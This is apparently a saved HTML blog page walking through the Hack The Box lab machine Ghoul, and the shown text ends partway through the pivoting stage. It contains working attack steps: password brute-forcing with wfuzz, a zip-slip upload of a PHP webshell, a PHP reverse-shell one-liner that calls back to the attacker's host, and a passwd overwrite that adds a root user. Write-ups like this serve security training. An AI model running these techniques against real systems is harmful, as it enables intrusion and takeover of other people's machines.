<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Ghoul - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Ghoul from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Ghoul">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ghoul/">


  <meta property="og:description" content="My write-up / walkthrough for Ghoul from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Ghoul">
  <meta name="twitter:description" content="My write-up / walkthrough for Ghoul from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/ghoul/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-10-05T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ghoul/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Ghoul">
    <meta itemprop="description" content="Hack The Box - Ghoul">
    <meta itemprop="datePublished" content="2019-10-05T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/ghoul/" class="u-url" itemprop="url">Hack The Box - Ghoul
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-10-05T07:00:00+02:00">October 5, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          26 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---ghoul">Hack The Box - Ghoul</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#initial-web-enumeration">Initial Web Enumeration</a></li>
<li><a href="#arbitrary-file-write-zip-slip--rce">Arbitrary File Write (Zip Slip) –&gt; RCE</a></li>
<li><a href="#privilege-escalation-on-aogiri-user-flag">Privilege Escalation on Aogiri, User Flag</a></li>
<li><a href="#enumeration-pivoting-from-aogiri-to-kaneki-pc">Enumeration, Pivoting from Aogiri to kaneki-pc</a></li>
<li><a href="#rce-in-gogs-pivoting-from-kaneki-pc-to-git">RCE in gogs, Pivoting from kaneki-pc to git</a></li>
<li><a href="#privilege-escalation-from-git-to-root-getting-aogiri-app7z">Privilege Escalation from git to root, Getting aogiri-app.7z</a></li>
<li><a href="#searching-through-git-commits-privilege-escalation-on-kaneki-pc">Searching Through git Commits, Privilege Escalation on kaneki-pc</a></li>
<li><a href="#hijacking-the-ssh-forward-agent-root-flag">Hijacking the SSH Forward Agent, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---ghoul">Hack The Box - Ghoul</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys, today Ghoul retired and here’s my write-up about it. It was a very hard box with a lot of rabbit holes, tons of enumeration and a lot of pivoting. However I enjoyed most parts of the box and learned some new stuff. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.101</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">ghoul.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/ghoul/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# nmap -sV -sT -sC -o nmapinitial ghoul.htb 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-04 12:47 EET
Nmap scan report for ghoul.htb (10.10.10.101)
Host is up (0.22s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.96 seconds
</code></pre></div></div>
<p>We got two <code class="language-plaintext highlighter-rouge">ssh</code> ports 22,2222 and two <code class="language-plaintext highlighter-rouge">http</code> ports 80,8080. Let’s check the first <code class="language-plaintext highlighter-rouge">http</code> port.<br></p>

<h2 id="initial-web-enumeration">Initial Web Enumeration</h2>
<p>By going to <code class="language-plaintext highlighter-rouge">http://ghoul.htb</code> we see a basic static website with nothing really interesting :
<br><img src="/images/hackthebox/ghoul/1.png" alt="" class="align-center"><br><br>
So I ran <code class="language-plaintext highlighter-rouge">gobuster</code> with the extensions <code class="language-plaintext highlighter-rouge">php</code> and <code class="language-plaintext highlighter-rouge">html</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# gobuster -u http://ghoul.htb/ -w /usr/share/wordlists/dirb/common.txt -x php,html

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://ghoul.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php,html
[+] Timeout      : 10s
=====================================================
2019/10/04 12:53:49 Starting gobuster
=====================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/archives (Status: 301)
/blog.html (Status: 200)
/contact.html (Status: 200)
/css (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/js (Status: 301)
/secret.php (Status: 200)
/server-status (Status: 403)
/uploads (Status: 301)
/users (Status: 301)
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">/secret.php</code> and <code class="language-plaintext highlighter-rouge">/users</code> look interesting.<br>
<code class="language-plaintext highlighter-rouge">/secret.php</code> :
<br><img src="/images/hackthebox/ghoul/2.png" alt="" class="align-center"><br><br>
Of course this user flag was just a troll, but there are two interesting things here, first one is <code class="language-plaintext highlighter-rouge">Noro</code> asking <code class="language-plaintext highlighter-rouge">Kaneki</code> for access and <code class="language-plaintext highlighter-rouge">Kaneki</code> replying with <code class="language-plaintext highlighter-rouge">ILoveTouka</code> which looks like a password. The other thing is the fake art site <code class="language-plaintext highlighter-rouge">Kaneki</code> talked about which is probably the site running on port 8080.<br>
<code class="language-plaintext highlighter-rouge">/users</code> :
<br><img src="/images/hackthebox/ghoul/3.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">ILoveTouka</code> didn’t work as a password so I tried to bruteforce the password with the username <code class="language-plaintext highlighter-rouge">admin</code> and I got it (<code class="language-plaintext highlighter-rouge">abcdef</code>) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# wfuzz --hh 1073 -c -u http://ghoul.htb/users/login.php -X POST -d "Username=admin&amp;Password=FUZZ&amp;Submit=Login" -w ./darkweb2017-top10000.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ghoul.htb/users/login.php
Total requests: 10000

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000242:  C=302      0 L        0 W            0 Ch        "abcdef"
000311:  C=200     37 L       81 W         1073 Ch        "12345qwert"^C
Finishing pending requests...
</code></pre></div></div>
<p>However this was just another troll :
<br><img src="/images/hackthebox/ghoul/4.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ghoul/5.png" alt="" class="align-center"><br><br>
I couldn’t find anything else on port 80 so I checked port 8080. It had basic <code class="language-plaintext highlighter-rouge">http</code> authentication :
<br><img src="/images/hackthebox/ghoul/6.png" alt="" class="align-center"><br><br>
But it was easily guessable, <code class="language-plaintext highlighter-rouge">admin : admin</code> :
<br><img src="/images/hackthebox/ghoul/7.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ghoul/8.png" alt="" class="align-center"><br><br>
This is the fake art website <code class="language-plaintext highlighter-rouge">Kaneki</code> was talking about, and we can upload images. But we can also upload <code class="language-plaintext highlighter-rouge">zip</code> archives :
<br><img src="/images/hackthebox/ghoul/9.png" alt="" class="align-center"><br><br></p>

<h2 id="arbitrary-file-write-zip-slip--rce">Arbitrary File Write (Zip Slip) –&gt; RCE</h2>
<p>The ability to upload zip archives can cause a vulnerability known as <a href="https://snyk.io/research/zip-slip-vulnerability" target="_blank" rel="noopener noreferrer">zip slip</a>. This happens when the archive has files with directory traversal paths in their names. During extraction, if the target is vulnerable it will write the extracted files to the specified paths in their names.<br>
We need to put a shell in <code class="language-plaintext highlighter-rouge">/var/www/html</code>, so I copied <code class="language-plaintext highlighter-rouge">simple-backdoor.php</code> to <code class="language-plaintext highlighter-rouge">/var/www/html</code> then I added it to a zip archive using a lot of <code class="language-plaintext highlighter-rouge">../</code> before the file path :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# cd /var/www/html/
root@kali:/var/www/html# cp /usr/share/webshells/php/simple-backdoor.php ./shell.php
root@kali:/var/www/html# zip shell.zip ../../../../../../../../../../var/www/html/shell.php 
  adding: ../../../../../../../../../../var/www/html/shell.php (deflated 35%)
root@kali:/var/www/html# cd -
/root/Desktop/HTB/boxes/ghoul
root@kali:~/Desktop/HTB/boxes/ghoul# mv /var/www/html/shell.zip .
root@kali:~/Desktop/HTB/boxes/ghoul# 
</code></pre></div></div>
<p>This is the easiest way to do it, let’s look at the file with <code class="language-plaintext highlighter-rouge">vi</code>, you’ll see the file name : 
<br><img src="/images/hackthebox/ghoul/10.png" alt="" class="align-center"><br><br>
When this <code class="language-plaintext highlighter-rouge">zip</code> is extracted on the machine it will put <code class="language-plaintext highlighter-rouge">shell.php</code> in <code class="language-plaintext highlighter-rouge">/var/www/html</code>.<br></p>

<p><br><img src="/images/hackthebox/ghoul/11.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ghoul/12.png" alt="" class="align-center"><br><br>
The shell was successfully uploaded :
<br><img src="/images/hackthebox/ghoul/13.png" alt="" class="align-center"><br><br>
Now we can simply get a reverse shell, the usual <code class="language-plaintext highlighter-rouge">nc</code> shell didn’t work because <code class="language-plaintext highlighter-rouge">nc</code> wasn’t installed on the box so I used <code class="language-plaintext highlighter-rouge">php</code> instead :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php -r '$sock=fsockopen("10.10.xx.xx",1337);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ghoul/14.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ghoul/15.png" alt="" class="align-center"><br><br></p>

<h2 id="privilege-escalation-on-aogiri-user-flag">Privilege Escalation on Aogiri, User Flag</h2>
<p>First thing I did after getting a shell was to get a stable shell :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@Aogiri:/var/www/html$ ^Z
[1]+  Stopped                 nc -lvnp 1337
root@kali:~/Desktop/HTB/boxes/ghoul# stty raw -echo
root@kali:~/Desktop/HTB/boxes/ghoul# nc -lvnp 1337

www-data@Aogiri:/var/www/html$ export TERM=screen
www-data@Aogiri:/var/www/html$ 
</code></pre></div></div>
<p>Then I checked <code class="language-plaintext highlighter-rouge">/home</code>, <code class="language-plaintext highlighter-rouge">www-data</code> couldnt access any of the directories :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/www/html$ cd /home/
www-data@Aogiri:/home$ ls -la
total 36
drwxr-xr-x 1 root   root   4096 Dec 13  2018 .
drwxr-xr-x 1 root   root   4096 Dec 13  2018 ..
drwx------ 1 Eto    Eto    4096 Dec 13  2018 Eto
drwx------ 1 kaneki kaneki 4096 Dec 13  2018 kaneki
drwx------ 1 noro   noro   4096 Dec 13  2018 noro
www-data@Aogiri:/home$ cd Eto/
bash: cd: Eto/: Permission denied
www-data@Aogiri:/home$ cd kaneki/
bash: cd: kaneki/: Permission denied
www-data@Aogiri:/home$ cd noro/
bash: cd: noro/: Permission denied
www-data@Aogiri:/home$ cd -
/var/www/html
www-data@Aogiri:/var/www/html$ 
</code></pre></div></div>
<p>So I had to escalate. By looking at the shell I uploaded I saw that it was created by root :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/www/html$ ls -la
total 352
drwxr-xr-x 1 root root   4096 Oct  4 11:17 .
drwxr-xr-x 1 root root   4096 Jan 22  2019 ..
drwxr-xr-x 1 root root   4096 Dec 13  2018 archives
-r-xr-xr-x 1 root root  10723 Dec 13  2018 blog.html
-r-xr-xr-x 1 root root   8977 Dec 13  2018 contact.html
dr-xr-xr-x 1 root root   4096 Dec 13  2018 css
-r-xr-xr-x 1 root root  37906 Dec 13  2018 eto.jpg
dr-xr-xr-x 1 root root   4096 Dec 13  2018 images
-r-xr-xr-x 1 root root  11000 Dec 13  2018 index.html
dr-xr-xr-x 1 root root   4096 Dec 13  2018 js
-r-xr-xr-x 1 root root  13721 Dec 13  2018 kaneki-ken.jpg
-rw-r--r-- 1 root root    239 Dec 13  2018 kaneki.html
-r-xr-xr-x 1 root root 112642 Dec 13  2018 kaneki.jpg
-r-xr-xr-x 1 root root    134 Dec 13  2018 kaneki.php
-r-xr-xr-x 1 root root  13721 Dec 13  2018 ken.jpg
dr-xr-xr-x 1 root root   4096 Dec 13  2018 less
-r-xr-xr-x 1 root root  18457 Dec 13  2018 noro.jpg
-r-xr-xr-x 1 root root   4865 Dec 13  2018 secret.php
-rw-r--r-- 1 root root    328 Oct  4 11:17 shell.php
-r-xr-xr-x 1 root root  18159 Dec 13  2018 tatara.jpg
dr-xr-xr-x 1 root root   4096 Dec 13  2018 uploads
dr-xr-xr-x 1 root root   4096 Dec 13  2018 users
www-data@Aogiri:/var/www/html$ 
</code></pre></div></div>
<p>So I tried to use the <code class="language-plaintext highlighter-rouge">zip</code> exploit again to overwrite <code class="language-plaintext highlighter-rouge">/etc/passwd</code>, but first I had to create the <code class="language-plaintext highlighter-rouge">passwd</code> file. I copied the one from the box :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
kaneki:x:1000:1000::/home/kaneki:/bin/bash
Eto:x:1001:1001::/home/Eto:/bin/bash
noro:x:1002:1002::/home/noro:/bin/bash
www-data@Aogiri:/var/www/html$ 
</code></pre></div></div>
<p>I used <code class="language-plaintext highlighter-rouge">openssl</code> to generate the hash of the password (<code class="language-plaintext highlighter-rouge">AAAA</code>) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# openssl passwd AAAA
gDlPrjU6SWeKo
</code></pre></div></div>
<p>Then I added a new user called <code class="language-plaintext highlighter-rouge">rooot</code> with the the <code class="language-plaintext highlighter-rouge">uid</code> 0  to the <code class="language-plaintext highlighter-rouge">passwd</code> file :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# echo "rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash" &gt;&gt; passwd
root@kali:~/Desktop/HTB/boxes/ghoul# cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
kaneki:x:1000:1000::/home/kaneki:/bin/bash
Eto:x:1001:1001::/home/Eto:/bin/bash
noro:x:1002:1002::/home/noro:/bin/bash
rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
root@kali:~/Desktop/HTB/boxes/ghoul#
</code></pre></div></div>
<p>After that I created the <code class="language-plaintext highlighter-rouge">zip</code> file like I did before :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# cd /etc/
root@kali:/etc# mv passwd passwd.1
root@kali:/etc# cp ~/Desktop/HTB/boxes/ghoul/passwd .
root@kali:/etc# cd -
/root/Desktop/HTB/boxes/ghoul
root@kali:~/Desktop/HTB/boxes/ghoul# zip passwd.zip ../../../../../../../../etc/passwd
  adding: ../../../../../../../../etc/passwd (deflated 62%)
root@kali:~/Desktop/HTB/boxes/ghoul# rm /etc/passwd
root@kali:~/Desktop/HTB/boxes/ghoul# mv /etc/passwd.1 /etc/passwd
root@kali:~/Desktop/HTB/boxes/ghoul# 
</code></pre></div></div>
<p>Then I uploaded it :
<br><img src="/images/hackthebox/ghoul/16.png" alt="" class="align-center"><br><br>
Now we can do <code class="language-plaintext highlighter-rouge">su rooot</code> and use <code class="language-plaintext highlighter-rouge">AAAA</code> as a password :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Aogiri:/var/www/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
kaneki:x:1000:1000::/home/kaneki:/bin/bash
Eto:x:1001:1001::/home/Eto:/bin/bash
noro:x:1002:1002::/home/noro:/bin/bash
rooot:gDlPrjU6SWeKo:0:0:root:/root:/bin/bash
www-data@Aogiri:/var/www/html$ su rooot
Password: 
root@Aogiri:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@Aogiri:/var/www/html# 
</code></pre></div></div>
<p>And I could get the user flag from <code class="language-plaintext highlighter-rouge">/home/kaneki</code> :
<br><img src="/images/hackthebox/ghoul/17.png" alt="" class="align-center"><br><br>
We owned user.<br></p>

<h2 id="enumeration-pivoting-from-aogiri-to-kaneki-pc">Enumeration, Pivoting from Aogiri to kaneki-pc</h2>
<p>After getting root I couldn’t find the root flag :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/home/kaneki# cd /root/
root@Aogiri:~# ls -la
total 48
drwx------ 1 root root  4096 Apr 28 14:17 .
drwxr-xr-x 1 root root  4096 Dec 13  2018 ..
lrwxrwxrwx 1 root root     9 Dec 29  2018 .bash_history -&gt; /dev/null
-rw-r--r-- 1 root root  3106 Dec 13  2018 .bashrc
drwx------ 1 root root  4096 Dec 13  2018 .cache
-rw-r--r-- 1 root root   148 Dec 13  2018 .profile
-rw-r--r-- 1 root root     0 Jan 22  2019 .selected_editor
drw------- 1 root root  4096 Dec 13  2018 .ssh
-rw------- 1 root root 12094 Apr 28 14:17 .viminfo
root@Aogiri:~# 
</code></pre></div></div>
<p>So I started to enumerate the home directories, web and configuration files.<br>
Every user had some notes (hints) in their home directory :
